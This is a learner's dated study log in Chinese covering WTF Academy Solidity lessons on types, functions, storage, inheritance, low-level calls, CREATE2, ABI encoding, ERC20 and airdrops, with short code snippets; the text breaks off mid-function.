---
timezone: Asia/Shanghai
---

---

# YuanboXie

1. 自我介绍: Web3 & AI researcher

2. 你认为你会完成本次残酷学习吗？可以
   
## Notes

- WTF Academy Solidity 101 1-15 [✅]
- WTF Academy Solidity 102 16-30 [✅]
- WTF Academy Solidity 103 31-50 [✅]
- 完成取得 Solidity 101、102 链上证书
    - 捐赠 eth 并 Mint 了 Solidity 101 证书 [✅]
    - Solidity 102 链上证书 [TODO] <del>据说之后可以免费 Mint，暂时先不 Mint</del>
- 其他贡献：
    - 在17、51、56节分别发现3处typos，已提交[PR](https://github.com/AmazingAng/WTF-Solidity/pull/796),目前 under review；

<!-- Content_START -->

### 2024.09.23

之前看过这个，但好久没写又忘了。今天重新捡起来复习一下。

- [101-1] 测试题有个地方第一遍打错了：`带有 pragma solidity ^0.8.4; 的智能合约能否被 solidity 0.8版本编译？`，答案是不行，这个0.8.4是只能被>=0.8.4的编译
- [101-2] 类型：value type、reference type、mapping type;
    - solidity 特殊类型：address，以及 payable address: `payable(address)`,后者比普通地址多了 transfer 和 send 方法, 以及可以通过 `address.balance` 查询余额;
    - 定长字节数组、不定长字节数组
    - enum

```solidity
address payable addr;
addr.transfer(1); // 注意这个是从合约给 addr 转账的意思，单位是 wei
```

- [101-3] function: 
```solidity
function <function name>(<parameter types>) {internal|external|public|private} [pure|view|payable] [returns (<return types>)]
```
- {internal|external|public|private}：可见性，合约中定义的函数需要明确指定可见性，它们没有默认值。public|private|internal 也可用于修饰状态变量。public变量会自动生成同名的getter函数，用于查询数值。未标明可见性类型的状态变量，默认为internal。
    - public：内部和外部均可见。
    - private：只能从本合约内部访问，继承的合约也不能使用。
    - external：只能从合约外部访问（但内部可以通过 this.f() 来调用，f是函数名）。
    - internal: 只能从合约内部访问，继承的合约可以用。
- [pure|view|payable]：决定函数权限/功能的关键字。
    - pure: 既不能读取也不能写入链上的状态变量;【这个一定要记住，这个容易记错！】
    - view: 能读取但也不能写入状态变量;
    - payable: 带 payable 的 function 可以存 ether;

以太坊交易需要支付 gas fee。合约的状态变量存储在链上，gas fee 很贵，如果计算不改变链上状态，就可以不用付 gas。包含 pure 和 view 关键字的函数是不改写链上状态的，因此用户直接调用它们是不需要付 gas 的（注意，合约中非 pure/view 函数调用 pure/view 函数时需要付gas）。

### 2024.09.24

- [101-4] 函数输出
- Solidity 中与函数输出相关的有两个关键字：return和returns。它们的区别在于：
    - returns：跟在函数名后面，用于声明返回的变量类型及变量名。
        - 命名式返回
    - return：用于函数主体中，返回指定的变量。
```solidity
// 返回多个变量
function returnMultiple() public pure returns(uint256, bool, uint256[3] memory){ // 数组类型返回值默认必须用 memory 修饰
    return(1, true, [uint256(1),2,5]);
}
```
- 解构赋值:
```solidity
(_number, _bool, _array) = returnNamed();
(, _bool2, ) = returnNamed();
```
- [101-5] 变量数据存储和作用域 storage/memory/calldata
- 引用类型(Reference Type)：包括数组（array）和结构体（struct），由于这类变量比较复杂，占用存储空间大，我们在使用时必须要声明数据存储的位置。
- Solidity数据存储位置有三类：storage，memory和calldata。不同存储位置的gas成本不同。storage类型的数据存在链上，类似计算机的硬盘，消耗gas多；memory和calldata类型的临时存在内存里，消耗gas少。
    - storage：合约里的状态变量默认都是storage，存储在链上。
    - memory：函数里的参数和临时变量一般用 memory，存储在内存中，不上链。如果返回数据类型是变长的情况下，必须加memory修饰，例如：string, bytes, array和自定义结构。
    - calldata：和memory类似，存储在内存中，不上链。与memory的不同点在于calldata变量不能修改，一般用于函数的参数。
- 在不同存储类型相互赋值时候，有时会产生独立的副本（修改新变量不会影响原变量），有时会产生引用（修改新变量会影响原变量）。
```solidity
uint[] x = [1,2,3]; // 状态变量：数组 x

function fStorage() public{
    //声明一个storage的变量 xStorage，指向x。修改xStorage也会影响x
    uint[] storage xStorage = x;
    uint[] memory xMemory = x; // memory 不会修改 storage 所以不是引用，此外 memory 赋值给 memory，会创建引用，改变新变量会影响原变量。
    xStorage[0] = 100;
}
```
- 全局变量、局部变量、状态变量
    - 全局变量：都是solidity预留关键字。他们可以在函数内不声明直接使用。 详细查看: [docs](https://learnblockchain.cn/docs/solidity/units-and-global-variables.html#special-variables-and-functions)
        - msg.sender
        - block.number
        - msg.data
        - blockhash(uint blockNumber): (bytes32) 给定区块的哈希值 – 只适用于256最近区块, 不包含当前区块。
        - block.coinbase: (address payable) 当前区块矿工的地址
        - block.gaslimit: (uint) 当前区块的gaslimit
        - block.number: (uint) 当前区块的number
        - block.timestamp: (uint) 当前区块的时间戳，为unix纪元以来的秒
        - gasleft(): (uint256) 剩余 gas
        - msg.data: (bytes calldata) 完整call data
        - msg.sender: (address payable) 消息发送者 (当前 caller)
        - msg.sig: (bytes4) calldata的前四个字节 (function identifier)
        - msg.value: (uint) 当前交易发送的 wei 值
        - block.blobbasefee: (uint) 当前区块的blob基础费用。这是Cancun升级新增的全局变量。
        - blobhash(uint index): (bytes32) 返回跟当前交易关联的第 index 个blob的版本化哈希（第一个字节为版本号，当前为0x01，后面接KZG承诺的SHA256哈希的最后31个字节）。若当前交易不包含blob，则返回空字节。这是Cancun升级新增的全局变量。
- 货币单位
    - wei: 1
    - gwei: 1e9 = 1000000000
    - ether: 1e18 = 1000000000000000000
- 时间单位
    - 1 seconds: 1
    - 1 minutes: 60 seconds = 60
    - 1 hours: 60 minutes = 3600
    - 1 days: 24 hours = 86400
    - 1 weeks: 7 days = 604800

- [101-6] array、struct
    - 固定长数组、变长数组
        - bytes 比较特殊，是数组，但是不用加[]。另外，不能用byte[]声明单字节数组，可以使用bytes或bytes1[]。bytes 比 bytes1[] 省gas。
        - 对于memory修饰的动态数组，可以用new操作符来创建，但是必须声明长度，并且声明后长度不能改变。
        ```solidity
        // memory动态数组
        uint[] memory array8 = new uint[](5);
        bytes memory array9 = new bytes(9);
        ```
        - array.length
        - 动态数组
            - array.push()
            - array.pop()

### 2024.09.25

- [101-7] mapping(_KeyType => _ValueType)
    - key 只能是 solidity 内置的值类型，value 可以是自定义 struct；mapping 不能用于 public 函数的参数或返回结果中；mapping 的存储位置必须是 storage; mapping 没有 .length;
    - Ethereum 会定义所有未使用的空间为 0，所以未赋值（Value）的键（Key）初始值都是各个 type 的默认值，如 uint 的默认值是 0;
- [101-8] delete 会让变量变为初始值;
- [101-9] Const & immutable
    - 数值变量可以声明 constant 和 immutable; string 和 bytes 可以声明为 constant，但不能为 immutable;
    - constant 变量必须在声明的时候初始化，之后再也不能改变;
    - immutable 变量可以在声明时或构造函数中初始化，因此更加灵活。在 Solidity v8.0.21 以后，immutable 变量不需要显式初始化。反之，则需要显式初始化。 若 immutable 变量既在声明时初始化，又在 constructor 中初始化，会使用 constructor 初始化的值;

### 2024.09.26

- [101-10] 控制流: if-else, for, while, do-while
- [101-11] 构造函数、修饰器
    - 在Solidity 0.4.22之前，构造函数不使用 constructor 而是使用与合约名同名的函数作为构造函数而使用，由于这种旧写法容易使开发者在书写时发生疏漏（例如合约名叫 Parents，构造函数名写成 parents），使得构造函数变成普通函数，引发漏洞，所以0.4.22版本及之后，采用了全新的 constructor 写法;
    - 新版构造函数: `constructor(){}` 构造函数（constructor）是一种特殊的函数，每个合约可以定义一个，并在部署合约的时候自动运行一次;
    - Modifier 修饰器:明函数拥有的特性，并减少代码冗余,使用场景是运行函数前的检查，例如地址，变量，余额等;
    ```solidity
    // 定义modifier
    modifier onlyOwner {
        require(msg.sender == owner); // 检查调用者是否为owner地址
        _; // 如果是的话，继续运行函数主体；否则报错并revert交易
    }
    function changeOwner(address _newOwner) external onlyOwner{
        owner = _newOwner; // 只有owner地址运行这个函数，并改变owner
    }
    ```
    - OpenZeppelin的Ownable标准实现: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol
- [101-12] Event
    - Solidity中的事件（event）是EVM上日志的抽象,事件是EVM上比较经济的存储数据的方式，每个大概消耗2,000 gas；相比之下，链上存储一个新变量至少需要20,000 gas。
    ```solidity
    event Transfer(address indexed from, address indexed to, uint256 value);
    // indexed: 会保存在以太坊虚拟机日志的topics中，方便之后检索
    ```
    - 以太坊虚拟机（EVM）用日志Log来存储Solidity事件，每条日志记录都包含主题topics和数据data两部分。![](./content/YuanboXie/evm-log.png)
        - 日志的第一部分是主题数组，用于描述事件，长度不能超过4。它的第一个元素是事件的签名（哈希）。对于上面的Transfer事件，它的事件哈希就是：keccak256("Transfer(address,address,uint256)")
        - 除了事件哈希，主题还可以包含至多3个indexed参数，也就是Transfer事件中的from和to。indexed标记的参数可以理解为检索事件的索引“键”，方便之后搜索。每个 indexed 参数的大小为固定的256比特，如果参数太大了（比如字符串），就会自动计算哈希存储在主题中。

### 2024.09.27

- [101-13] 继承：Solidity中的修饰器（Modifier）同样可以继承，用法与函数继承类似，在相应的地方加virtual和override关键字即可。
    - virtual: 父合约中的函数，如果希望子合约重写，需要加上virtual关键字。
    - override：子合约重写了父合约中的函数，需要加上override关键字。用override修饰public变量，会重写与变量同名的getter函数。
    - 多重继承
        - Solidity的合约可以继承多个合约。继承时要按辈分最高到最低的顺序排。
        - 如果某一个函数在多个继承的合约里都存在，在子合约里必须重写，不然会报错。
        - 重写在多个父合约中都重名的函数时，override 关键字后面要加上所有父合约名字。
    - 构造函数的继承
        - 方法一：在继承时声明父构造函数的参数，例如：contract B is A(1)
        - 在子合约的构造函数中声明构造函数的参数，例如：
        ```solidity
        contract C is A {
            constructor(uint _c) A(_c * _c) {}
        }
        ```
    - 调用父合约的函数
        - 直接调用：子合约可以直接用父合约名.函数名()的方式来调用父合约函数;
        - super.函数名():
        - 钻石继承/菱形继承：一个派生类同时有两个或两个以上的基类。
        ```solidity
        /* 继承树：
        God
        /  \
        Adam Eve
        \  /
        people
        */
        contract people is Adam, Eve{}
        // 调用合约people中的super.func()会依次调用Eve、Adam，最后是God合约。
        ```
- [101-14] 抽象合约和接口
    - 如果一个智能合约里至少有一个未实现的函数，即某个函数缺少主体{}中的内容，则必须将该合约标为abstract，不然编译会报错；另外，未实现的函数需要加virtual，以便子合约重写。
    - 接口类似于抽象合约，但它不实现任何功能。接口的规则：
        - 不能包含状态变量、不能包含构造函数、不能继承除接口外的其他合约、所有函数都必须是external且不能有函数体、继承接口的非抽象合约必须实现接口定义的所有功能。
    - 接口提供了两个重要的信息：
        - 合约里每个函数的bytes4选择器，以及函数签名函数名（每个参数类型）;
        - 接口id [eip-165](https://eips.ethereum.org/EIPS/eip-165);
        - 接口与合约ABI（Application Binary Interface）等价，可以相互转换：编译接口可以得到合约的ABI，利用[abi-to-sol](https://gnidan.github.io/abi-to-sol/)工具，也可以将ABI json文件转换为接口sol文件。接口和常规合约的区别在于每个函数都以;代替函数体{ }结尾。
        ```solidity
        interface IERC721 is IERC165 {
            event Transfer(address indexed from, address indexed to, uint256 indexed tokenId); // 在转账时被释放，记录代币的发出地址from，接收地址to和tokenId。
            event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId); // 在授权时被释放，记录授权地址owner，被授权地址approved和tokenId。
            event ApprovalForAll(address indexed owner, address indexed operator, bool approved); // 在批量授权时被释放，记录批量授权的发出地址owner，被授权地址operator和授权与否的approved。
            function balanceOf(address owner) external view returns (uint256 balance); // 返回某地址的NFT持有量balance。
            function ownerOf(uint256 tokenId) external view returns (address owner); // 返回某tokenId的主人owner。
            function safeTransferFrom(address from, address to, uint256 tokenId) external; // 安全转账（如果接收方是合约地址，会要求实现ERC721Receiver接口）。参数为转出地址from，接收地址to和tokenId。
            function transferFrom(address from, address to, uint256 tokenId) external; // 普通转账，参数为转出地址from，接收地址to和tokenId。
            function approve(address to, uint256 tokenId) external; // 授权另一个地址使用你的NFT。参数为被授权地址approve和tokenId。
            function getApproved(uint256 tokenId) external view returns (address operator); // 查询tokenId被批准给了哪个地址。
            function setApprovalForAll(address operator, bool _approved) external; // 将自己持有的该系列NFT批量授权给某个地址operator。
            function isApprovedForAll(address owner, address operator) external view returns (bool); // 查询某地址的NFT是否批量授权给了另一个operator地址。
            function safeTransferFrom( address from, address to, uint256 tokenId, bytes calldata data) external; // 安全转账的重载函数，参数里面包含了data。
        }
        ```
        - 如果我们知道一个合约实现了IERC721接口，我们不需要知道它具体代码实现，就可以与它交互。
- [101-15] 异常：error，require和assert
    - Error: solidity 0.8.4版本新加的内容，方便且高效（省gas）地向用户解释操作失败的原因，同时还可以在抛出异常的同时携带参数，帮助开发者更好地调试。人们可以在contract之外定义异常。
    ```solidity
    error TransferNotOwner(address sender); // 自定义的带参数的error
    function transferOwner1(uint256 tokenId, address newOwner) public {
        if(_owners[tokenId] != msg.sender){
            revert TransferNotOwner(msg.sender);
        }
        _owners[tokenId] = newOwner;
    }
    ```
    - Require: solidity 0.8版本之前抛出异常的常用方法，目前很多主流合约仍然还在使用它。它很好用，唯一的缺点就是gas随着描述异常的字符串长度增加，比error命令要高
    - assert命令一般用于程序员写程序debug，因为它不能解释抛出异常的原因（比require少个字符串）。它的用法很简单，assert(检查条件），当检查条件不成立的时候，就会抛出异常。
    - 三种方法的gas比较:error方法gas最少，其次是assert，require方法消耗gas最多！因此，error既可以告知用户抛出异常的原因，又能省gas。

### 2024.09.28

- [102-16] 函数重载: Solidity中允许函数进行重载（overloading），即名字相同但输入参数类型不同的函数可以同时存在，他们被视为不同的函数。注意，Solidity不允许修饰器（modifier）重载。
    - 重载函数在经过编译器编译后，由于不同的参数类型，都变成了不同的函数选择器（selector）
    - 实参匹配（Argument Matching）：在调用重载函数时，会把输入的实际参数和函数参数的变量类型做匹配。 如果出现多个匹配的重载函数，则会报错。
    ```solidity
    // f(50)，因为50既可以被转换为uint8，也可以被转换为uint256，因此会报错。
    function f(uint8 _in) public pure returns (uint8 out) {
        out = _in;
    }

    function f(uint256 _in) public pure returns (uint256 out) {
        out = _in;
    }
    ```
- [102-17] 库合约
    - 和普通合约主要有以下几点不同：
        - 不能存在状态变量、不能够继承或被继承、不能接收以太币、不可以被销毁
    - 库合约中的函数可见性如果被设置为 public 或者 external，则在调用函数时会触发一次 delegatecall。而如果被设置为 internal，则不会引起。对于设置为 private 可见性的函数来说，其仅能在库合约中可见，在其他合约中不可用。
    - 如何使用库合约：
        - using for：用于附加库合约（从库 A）到任何类型（B）。添加完指令后，库A中的函数会自动添加为B类型变量的成员，可以直接调用。注意：在调用的时候，这个变量会被当作第一个参数传递给函数;
        ```solidity
        // 利用using for指令
        using Strings for uint256;
        function getString1(uint256 _number) public pure returns(string memory){
            // 库合约中的函数会自动添加为uint256型变量的成员
            return _number.toHexString();
        }
        ```
        - 通过库合约名称调用函数
        ```solidity
        // 直接通过库合约名调用
        function getString2(uint256 _number) public pure returns(string memory){
            return Strings.toHexString(_number);
        }
        ```
    - 常用库：
        - [Strings](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Strings.sol)
        - [Address](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Address.sol)
        - [Create2](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Create2.sol)
        - [Arrays](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/4a9cc8b4918ef3736229a5cc5a310bdc17bf759f/contracts/utils/Arrays.sol)
- [102-18] Import
```solidity
文件结构
├── Import.sol
└── Yeye.sol

// 通过文件相对位置import
import './Yeye.sol';
import {Yeye} from './Yeye.sol';

// 通过网址引用
import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol';

// 通过npm的目录导入
import '@openzeppelin/contracts/access/Ownable.sol';
```

### 2024.09.29
- [102-19] 接收 ETH
    - Solidity支持两种特殊的回调函数，receive()和fallback(),主要用于两种场景：1）接收 ETH；2）处理合约中不存在的函数调用（代理合约 proxy contract）;
    - 注意：在Solidity 0.6.x版本之前，语法上只有 fallback() 函数，用来接收用户发送的ETH时调用以及在被调用函数签名没有匹配到时，来调用。 0.6版本之后，Solidity才将 fallback() 函数拆分成 receive() 和 fallback() 两个函数。
    - receive()
        - 一个合约最多有一个receive()函数,receive() external payable { ... }。receive()函数不能有任何的参数，不能返回任何值，必须包含external和payable。
        - receive()最好不要执行太多的逻辑因为如果别人用send和transfer方法发送ETH的话，gas会限制在2300，receive()太复杂可能会触发Out of Gas报错；如果用call就可以自定义gas执行更复杂的逻辑。
    - fallback()
        - fallback()函数会在调用合约不存在的函数时被触发。可用于接收ETH，也可以用于代理合约proxy contract。一般也会用payable修饰。
    - 【提醒】有些恶意合约，会在receive()/fallback() 函数嵌入恶意消耗gas的内容或者使得执行故意失败的代码，导致一些包含退款和转账逻辑的合约不能正常工作，因此写包含退款等逻辑的合约时候，一定要注意这种情况。
    - receive() vs fallback()
        - receive和fallback都能够用于接收ETH，他们触发的规则如下：
        ```
        触发fallback() 还是 receive()?
                接收ETH
                    |
                msg.data是空？
                    /  \
                是    否
                /      \
        receive()存在?   fallback()
                / \
            是  否
            /     \
        receive()   fallback()
        ```
        - receive()和payable fallback()均不存在的时候，向合约直接发送ETH将会报错（但可以通过合约里带有payable的其他函数发送ETH）。
- [102-20] 发送ETH:transfer()，send()和call()
    - transfer 【不推荐，可能会被DoS】
        - 接收方地址.tranfer(eth_amount)
        - gas limit 2300
        - 转账失败会 revert
    - send 【不推荐】
        - 接收方地址.send(eth_amount)
        - gas limit 2300
        - 转账失败不会 revert
        - 返回值：bool
    - call
        - 接收方地址.call{value: eth_amount}("")
        - 无 gas 限制
        - 转账失败不会 revert
        - call()的返回值是(bool, bytes)
    - 一个习题：EOA调用合约A的sendeth函数给合约b发eth，合约a、b均无eth。这里的执行逻辑是先把交易带的eth加到合约a上，所以sendeth不会revert。
- [102-21] 调用其他合约
    - 传入合约地址：OtherContract(_Address).setX(x);
    - 合约变量：OtherContract _Address （本质上还是address）

### 2024.09.30

- [102-22] Call
    - call 是address类型的低级成员函数，它用来与其他合约交互。它的返回值为(bool, bytes memory)，分别对应call是否成功以及目标函数的返回值。
    - 不推荐用call来调用另一个合约，可能会导致安全问题。推荐的方法仍是声明合约变量后调用函数。
    ```solidity
    目标合约地址.call(字节码);
    目标合约地址.call{value:发送数额, gas:gas数额}(字节码);
    // 字节码计算：abi.encodeWithSignature("函数签名", 逗号分隔的具体参数)
    ```
- [102-23] Delegatecall 【重要‼️】
    - delegate中是委托/代表的意思，那么delegatecall委托了什么？
        - 当用户A通过合约B来call合约C的时候，执行的是合约C的函数，上下文(Context，可以理解为包含变量和状态的环境)也是合约C的：msg.sender是B的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约C的变量上;
        - 当用户A通过合约B来delegatecall合约C的时候，执行的是合约C的函数，但是上下文仍是合约B的：msg.sender是A的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约B的变量上;
        - 一个很好的比喻：
        > 一个投资者（用户A）把他的资产（B合约的状态变量）都交给一个风险投资代理（C合约）来打理。执行的是风险投资代理的函数，但是改变的是资产的状态。
    ```solidity
    目标合约地址.delegatecall(二进制编码);
    ```
    - delegatecall在调用合约时可以指定交易发送的gas，但不能指定发送的ETH数额
    - 注意：delegatecall有安全隐患，使用时要保证当前合约和目标合约的状态变量存储结构相同，并且目标合约安全，不然会造成资产损失。
    - 使用场景：
        - 代理合约（Proxy Contract）：将智能合约的存储合约和逻辑合约分开：代理合约（Proxy Contract）存储所有相关的变量，并且保存逻辑合约的地址；所有函数存在逻辑合约（Logic Contract）里，通过delegatecall执行。当升级时，只需要将代理合约指向新的逻辑合约即可。
        - EIP-2535 Diamonds（钻石）：钻石是一个支持构建可在生产中扩展的模块化智能合约系统的标准。钻石是具有多个实施合约的代理合约。 [link](https://eip2535diamonds.substack.com/p/introduction-to-the-diamond-standard)
- [102-24] 在合约中创建新合约：Create
    - `Contract x = new Contract{value: _value}(params)`
    - 使用场景：去中心化交易所 uniswap 利用工厂合约（PairFactory）创建了无数个币对合约（Pair）： [code](https://github.com/Uniswap/v2-core/tree/master/contracts)
        - UniswapV2Pair: 币对合约，用于管理币对地址、流动性、买卖。
        - UniswapV2Factory: 工厂合约，用于创建新的币对，并管理币对地址。

### 2024.10.01

- [102-25] 在合约中创建新合约：Create2
    - CREATE2 操作码使我们在智能合约部署在以太坊网络之前就能预测合约的地址。CREATE2 的目的是为了让合约地址独立于未来的事件。
    - 用CREATE2创建的合约地址由4个部分决定：`Contract x = new Contract{salt: _salt, value: _value}(params)`
        - 0xFF：一个常数，避免和CREATE冲突
        - CreatorAddress: 调用 CREATE2 的当前合约（创建合约）地址。
        - salt（盐）：一个创建者指定的bytes32类型的值，它的主要目的是用来影响新创建的合约的地址。
        - initcode: 新合约的初始字节码（合约的Creation Code和构造函数的参数）。
    - 提前计算地址：
        - 无参数：
        ```solidity
        // 计算合约地址方法 hash()
        predictedAddress = address(uint160(uint(keccak256(abi.encodePacked(
            bytes1(0xff),
            address(this),
            salt,
            keccak256(type(Pair).creationCode)
        )))));
        ```
        - 有参数：
        ```solidity
        predictedAddress = address(uint160(uint(keccak256(abi.encodePacked(
                bytes1(0xff),
                address(this),
                salt,
                keccak256(abi.encodePacked(type(Pair).creationCode, abi.encode(address(this))))
            )))));
        ```
    - 使用场景：
        - 交易所为新用户预留创建钱包合约地址。
    - Create VS Create2
        - create: `新地址 = hash(创建者地址, nonce)`。由于nonce不确定（你不知道你是第几个，因为别人也可能在调用）所以无法预测地址。
        - create2: `新地址 = hash("0xFF",创建者地址, salt, initcode)`。新合约的地址由创建者地址、salt值(一个256位的值)、合约字节码计算得出。可以预测出创造出的合约地址。
- [102-26] 删除合约：selfdestruct `selfdestruct(_addr)；`
    - selfdestruct 命令可以用来删除智能合约，并将该合约剩余ETH转到指定地址。selfdestruct 是为了应对合约出错的极端情况而设计的。它最早被命名为 suicide，但是这个词太敏感，改名为 selfdestruct。在 [v0.8.18](https://soliditylang.org/blog/2023/02/01/solidity-0.8.18-release-announcement/) 版本中，selfdestruct 关键字被标记为「不再建议使用」，在一些情况下它会导致预期之外的合约语义，但由于目前还没有代替方案，目前只是对开发者做了编译阶段的警告，相关内容可以查看 [EIP-6049](https://eips.ethereum.org/EIPS/eip-6049)。
    - 在以太坊坎昆（Cancun）升级中，EIP-6780 被纳入升级以实现对 Verkle Tree 更好的支持。EIP-6780 减少了 SELFDESTRUCT 操作码的功能。根据提案描述，当前 SELFDESTRUCT 仅会被用来将合约中的 ETH 转移到指定地址，而原先的删除功能只有在合约创建-自毁这两个操作处在同一笔交易时才能生效。所以目前来说：
        - 已经部署的合约无法被SELFDESTRUCT了。
        - 如果要使用原先的SELFDESTRUCT功能，必须在同一笔交易中创建并SELFDESTRUCT。
- [102-27] ABI编码解码
    - ABI (Application Binary Interface，应用二进制接口)是与以太坊智能合约交互的标准。数据基于他们的类型编码；并且由于编码后不包含类型信息，解码时需要注明它们的类型。 [docs-abi_spec](https://learnblockchain.cn/docs/solidity/abi-spec.html)
    - 编码：
        - abi.encode: 非紧凑编码，每个类型的数据都填充到32bytes，与合约交互要用这个
        - abi.encodePacked：紧凑编码，用于算hash，长度比abi.encode短很多
        - abi.encodeWithSignature：与abi.encode功能类似，只不过第一个参数为函数签名。等同于在abi.encode编码结果前加上了4字节的函数选择器。`result = abi.encodeWithSignature("foo(uint256,address,string,uint256[2])", x, addr, name, array);`
        - abi.encodeWithSelector：与abi.encodeWithSignature功能类似，只不过第一个参数为函数选择器,`result = abi.encodeWithSelector(bytes4(keccak256("foo(uint256,address,string,uint256[2])")), x, addr, name, array);`
    - 解码：abi.decode
        - `(dx, daddr, dname, darray) = abi.decode(data, (uint, address, string, uint[2]));`

### 2024.10.02

- [102-28] Hash
    - 一个好的哈希函数应该具有以下几个特性：
        - 单向性：从输入的消息到它的哈希的正向运算简单且唯一确定，而反过来非常难，只能靠暴力枚举。
        - 灵敏性：输入的消息改变一点对它的哈希改变很大。
        - 高效性：从输入的消息到哈希的运算高效。
        - 均一性：每个哈希值被取到的概率应该基本相等。
        - 抗碰撞性：
            - 弱抗碰撞性：给定一个消息x，找到另一个消息x'，使得hash(x) = hash(x')是困难的。
            - 强抗碰撞性：找到任意x和x'，使得hash(x) = hash(x')是困难的。
    - `哈希 = keccak256(数据);`
    - SHA3由keccak标准化而来，在很多场合下Keccak和SHA3是同义词，但在2015年8月SHA3最终完成标准化时，NIST调整了填充算法。所以SHA3就和keccak计算的结果不一样。以太坊在开发的时候sha3还在标准化中，所以采用了keccak，所以Ethereum和Solidity智能合约代码中的SHA3是指Keccak256，而不是标准的NIST-SHA3，为了避免混淆，直接在合约代码中写成Keccak256是最清晰的。
    - 使用场景：
        - 生成数据唯一标识：`keccak256(abi.encodePacked(_num, _string, _addr))`
- [102-29] 选择器
    - 调用智能合约时，本质上是向目标合约发送了一段 calldata。sg.data 是 Solidity 中的一个全局变量，值为完整的 calldata。
    - 在函数签名中，uint 和 int 要写为 uint256 和 int256。
    - 计算 method id 时，需要通过函数名和函数的参数类型来计算。在Solidity中，函数的参数类型主要分为：基础类型参数，固定长度类型参数，可变长度类型参数和映射类型参数。
        - `bytes4(keccak256("elementaryParamSelector(uint256,bool)"))`
        - `bytes4(keccak256("fixedSizeParamSelector(uint256[3])"))`
        - `bytes4(keccak256("nonFixedSizeParamSelector(uint256[],string)"))`
        - 映射类型参数通常有：contract、enum、struct等。在计算method id时，需要将该类型转化成为ABI类型。
        ```solidity
        contract DemoContract {
            // empty contract
        }

        contract Selector{
            // Struct User
            struct User {
                uint256 uid;
                bytes name;
            }
            // Enum School
            enum School { SCHOOL1, SCHOOL2, SCHOOL3 }
            ...
            // mapping（映射）类型参数selector
            // 输入：demo: 0x9D7f74d0C41E726EC95884E0e97Fa6129e3b5E99， user: [1, "0xa0b1"], count: [1,2,3], mySchool: 1
            // mappingParamSelector(address,(uint256,bytes),uint256[],uint8) : 0xe355b0ce
            function mappingParamSelector(DemoContract demo, User memory user, uint256[] memory count, School mySchool) external returns(bytes4 selectorWithMappingParam){
                emit SelectorEvent(this.mappingParamSelector.selector);
                return bytes4(keccak256("mappingParamSelector(address,(uint256,bytes),uint256[],uint8)"));
            }
            ...
        }
        ```
- [102-30] Try Catch
    - Solidity 0.6 版本添加了 try-catch。try-catch 只能被用于 external 函数或创建合约时 constructor（被视为 external 函数）的调用。
    ```solidity
    try externalContract.f() {
        // call成功的情况下 运行一些代码
    } catch {
        // call失败的情况下 运行一些代码
    }

    try externalContract.f() returns(returnType val) {
        // call成功的情况下 try模块中可以使用返回的变量,如果是创建合约，那么返回值是新创建的合约变量。
    } catch {
        // call失败的情况下 运行一些代码
    }

    try externalContract.f() returns(returnType){
        // call成功的情况下 运行一些代码
    } catch Error(string memory /*reason*/) {
        // 捕获revert("reasonString") 和 require(false, "reasonString")
    } catch Panic(uint /*errorCode*/) {
        // 捕获Panic导致的错误 例如assert失败 溢出 除零 数组访问越界
    } catch (bytes memory /*lowLevelData*/) {
        // 如果发生了revert且上面2个异常类型匹配都失败了 会进入该分支
        // 例如revert() require(false) revert自定义类型的error
    }
    ```
    - 可以使用this.f()来替代externalContract.f()，this.f()也被视作为外部调用，但不可在构造函数中使用，因为此时合约还未创建。
    - try 代码块内的 revert 不会被 catch 本身捕获。

### 2024.10.03

- [103-31] ERC20
    - 来自15年V神参与的 [EIP-20](https://eips.ethereum.org/EIPS/eip-20)，实现了代币转账的基本逻辑。IERC20是ERC20代币标准的接口合约，规定了ERC20代币需要实现的函数和事件。
        - 账户余额 balanceOf()
        - 转账 transfer()
        - 授权转账 transferFrom()
        - 授权 approve()
        - 代币总供给 totalSupply()
        - 授权转账额度 allowance()
        - 代币信息（可选）：名称(name())，代号(symbol())，小数位数(decimals())
    - IERC20定义了2个事件：Transfer事件和Approval事件，分别在转账和授权时被释放
        - event Transfer(address indexed from, address indexed to, uint256 value);
        - event Approval(address indexed owner, address indexed spender, uint256 value);
    - IERC20定义了6个函数，提供了转移代币的基本功能
        - function totalSupply() external view returns (uint256);
        - function balanceOf(address account) external view returns (uint256);
        - function transfer(address to, uint256 amount) external returns (bool);
        - function allowance(address owner, address spender) external view returns (uint256); 返回`owner`账户授权给`spender`账户的额度
        - function approve(address spender, uint256 amount) external returns (bool); 授权
        - function transferFrom(address from,address to,uint256 amount) external returns (bool); 授权转账
    - 一般不自己手撸，而是基于 OpenZeppelin 模版改：[docs](https://docs.openzeppelin.com/contracts/5.x/erc20) [ERC20-template](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol)
    - 本节示例代码：[code](https://github.com/AmazingAng/WTF-Solidity/blob/main/31_ERC20/ERC20.sol)，注意，这个示例代码是有安全问题的，这里仅供示范。
- [103-32] 代币水龙头:代币水龙头就是让用户免费领代币的网站/应用。
    - 示例代码：[code](https://github.com/AmazingAng/WTF-Solidity/blob/main/32_Faucet/Faucet.sol)，注意，这个示例代码是有安全问题的，这里仅供示范。
- [103-33] 空投合约
    - 因为每次接收空投的用户很多，项目方不可能一笔一笔的转账。利用智能合约批量发放ERC20代币，可以显著提高空投效率。
    ```solidity
    /// @notice 向多个地址转账ERC20代币，使用前需要先授权
    ///
    /// @param _token 转账的ERC20代币地址
    /// @param _addresses 空投地址数组
    /// @param _amounts 代币数量数组（每个地址的空投数量）
    function multiTransferToken(
        address _token,
        address[] calldata _addresses,
        uint256[] calldata _amounts
        ) external {
        // 检查：_addresses和_amounts数组的长度相等
        require(_addresses.length == _amounts.length, "Lengths of Addresses and Amounts NOT EQUAL");
        IERC20 token = IERC20(_token); // 声明IERC合约变量
        uint _amountSum = getSum(_amounts); // 计算空投代币总量
        // 检查：授权代币数量 >= 空投代币总量
        require(token.allowance(msg.sender, address(this)) >= _amountSum, "Need Approve ERC20 token");

